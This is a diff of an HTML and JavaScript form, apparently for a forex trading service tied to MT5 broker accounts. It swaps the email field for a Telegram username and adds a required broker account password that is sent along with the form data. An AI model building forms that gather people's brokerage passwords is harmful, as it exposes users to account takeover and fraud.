@@ -228,16 +228,17 @@ label{
             </div>
 
 
-            <!-- EMAIL -->
+            <!-- TELEGRAM USERNAME -->
             <div>
-                <label for="email">EMAIL ADDRESS *</label>
+                <label for="telegram">TELEGRAM USERNAME *</label>
 
                 <input
-                    id="email"
-                    name="email"
+                    id="telegram"
+                    name="telegram"
                     class="input"
-                    type="email"
-                    placeholder="your@email.com"
+                    type="text"
+                    placeholder="@username"
+                    autocomplete="off"
                     required>
             </div>
 
@@ -292,6 +293,21 @@ label{
                     class="input"
                     type="text"
                     placeholder="Example: Exness-MT5Real"
+                    required>
+            </div>
+
+
+            <!-- PASSWORD -->
+            <div>
+                <label for="password">ACCOUNT PASSWORD *</label>
+
+                <input
+                    id="password"
+                    name="password"
+                    class="input"
+                    type="password"
+                    placeholder="Enter account password"
+                    autocomplete="off"
                     required>
             </div>
 
@@ -579,8 +595,11 @@ form.addEventListener("submit", async function(e){
         whatsapp:
             document.getElementById("whatsapp").value.trim(),
 
-        email:
-            document.getElementById("email").value.trim(),
+        telegram:
+            document.getElementById("telegram").value.trim(),
+
+        password:
+            document.getElementById("password").value,
 
         broker:
             document.getElementById("broker").value.trim(),
